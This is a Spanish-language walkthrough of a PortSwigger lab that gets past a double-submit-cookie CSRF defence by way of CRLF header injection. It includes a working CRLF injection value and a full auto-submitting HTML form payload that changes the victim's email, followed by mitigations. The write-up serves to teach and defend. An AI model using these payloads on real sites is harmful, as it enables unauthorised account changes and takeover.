
---

# CSRF con token duplicado en cookie

## 1. Introducción

Este laboratorio presenta una implementación vulnerable del mecanismo de protección CSRF conocido como **double submit cookie**, donde el servidor compara el token enviado en la cookie con el token enviado como parámetro en el formulario.

El objetivo del laboratorio es aprovechar que ambos valores (cookie y parámetro) **pueden ser controlados por el atacante**, permitiendo forzar una acción no autorizada en nombre de la víctima.

[Ver laboratorio Portswigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)


---

## 2. Contexto de la vulnerabilidad

La aplicación usa la técnica de:

```
Double Submit Cookie
```

Es decir:

- El navegador incluye automáticamente una cookie `csrf=<valor>`
    
- El formulario incluye un campo oculto `csrf=<valor>`
    
- El servidor valida: `cookie.csrf == body.csrf`
    

Esta técnica es considerada insegura si:

1. La cookie puede ser modificada desde el navegador
    
2. Ambas fuentes provienen del cliente
    
3. No existe asociación con sesión o secreto del servidor
    
4. No hay validación de integridad (HMAC, firma, etc.)
    

En este laboratorio ocurre exactamente esto:

> El valor del token puede ser fijado arbitrariamente por un atacante.

---

## 3. Análisis de peticiones

### 3.1 Observación clave en Burp

Enviamos una petición de cambio de correo y vemos:

- Campo oculto: `csrf=<valor>`
    
- Cookie: `csrf=<valor>`
    

El servidor responde **200 OK** siempre y cuando:

```
csrf_cookie == csrf_body_param
```

No se valida:

- Sesión
    
- Usuario
    
- Integridad
    
- Origen
    

### 3.2 Funcionalidad adicional peligrosa

La funcionalidad de búsqueda refleja parámetros en:

```
Set-Cookie:
```

Lo cual significa que el atacante puede **inyectar cookies en el navegador de otro usuario**.

Ejemplo visto:

```
?search=test%0d%0aSet-Cookie: csrf=fake; SameSite=None
```

Donde:

- `%0d` = Carriage Return
    
- `%0a` = Line Feed
    

Ambos en conjunto (`%0d%0a`) permiten romper una cabecera y comenzar otra nueva:

```
CRLF
Set-Cookie: csrf=fake
```

Esto es una **CRLF injection** en toda regla.

---

## 4. Explotación

La estrategia consiste en:

1. Inyectar una cookie `csrf=fake` en el navegador víctima
    
2. Crear un formulario que envíe `csrf=fake`
    
3. Dejar que el navegador envíe ambos valores al servidor
    
4. El servidor valida igualdad → éxito
    

El payload final:

```html
<form class="login-form" name="change-email-form" action="https://0a45002c0341114d803103f9005600c1.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pepe@pepin.com">
    <input required="" type="hidden" name="csrf" value="test">
</form>

<img src="https://0a45002c0341114d803103f9005600c1.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

### ¿Qué ocurre aquí?

- El `<img>` fuerza petición GET
    
- Esta petición genera el `Set-Cookie: csrf=test`
    
- Al fallar la carga (`onerror`)
    
- Se ejecuta `document.forms[0].submit()`
    
- El formulario envía `csrf=test`
    
- La cookie envía `csrf=test`
    
- El servidor acepta el cambio de email
    

✔ Sin interacción del usuario  
✔ Sin validación de origen  
✔ Sin clave secreta

---

## 5. **Publicación y verificación**

El exploit se publica en el servidor del laboratorio.

Luego:

1. Se almacena el exploit
    
2. Se pulsa "Deliver to victim"
    
3. El servidor víctima ejecuta:
    
    - GET → inyección cookie
        
    - POST → cambio de email
        

Si el email cambia → lab completado.

---

## 6. Fundamentación técnica

Este ataque demuestra una debilidad inherente del **double submit token**:

> Si el navegador controla ambos valores, no existe autenticidad ni garantía de origen.

En otras palabras:

- El servidor confía "en exceso" en el navegador
    
- El navegador es parte del atacante
    
- Todo lo que depende del cliente es manipulable
    

Además, el diseño del sistema falla porque:

- No vincula token a sesión
    
- No valida origen
    
- No incorpora secretos del servidor
    
- Permite CRLF injection
    
- Permite escribir cookies arbitrarias
    
- Confía ciegamente en igualdad de cadenas
    

---

## 7. Conclusión

Este laboratorio es un excelente ejemplo de por qué el doble envío de token no es una defensa robusta:

- Es trivial falsificar el token
    
- Es trivial falsificar la cookie
    
- Basta que ambos coincidan
    
- No hay verificación de contexto
    

El único requisito para el ataque es:

> Obtener control sobre el estado del navegador víctima

Y la funcionalidad de búsqueda nos lo concede mediante CRLF injection.

---

## 8. Mitigaciones

Para proteger de forma robusta:

1. El token debe ser derivado del servidor
    
2. Debe estar vinculado a sesión
    
3. Debe tener integridad criptográfica (HMAC)
    
4. No debe depender exclusivamente del cliente
    
5. Validar origen (Origin/Referer)
    
6. Proteger contra CRLF en parámetros
    
7. Establecer `SameSite=Lax` o `Strict` cuando sea viable
    

---

# Resumen conceptual clave

Este laboratorio muestra un bypass completo de CSRF cuando:

- El navegador controla ambos tokens
    
- No hay vínculo a sesión
    
- No hay protección criptográfica
    
- Es posible inyectar cookies remotamente
    

Combinando:

- **CRLF injection**
    
- **Double submit token**
    

El atacante obtiene control total del estado de la víctima y ejecuta acciones críticas sin autenticación adicional.

---
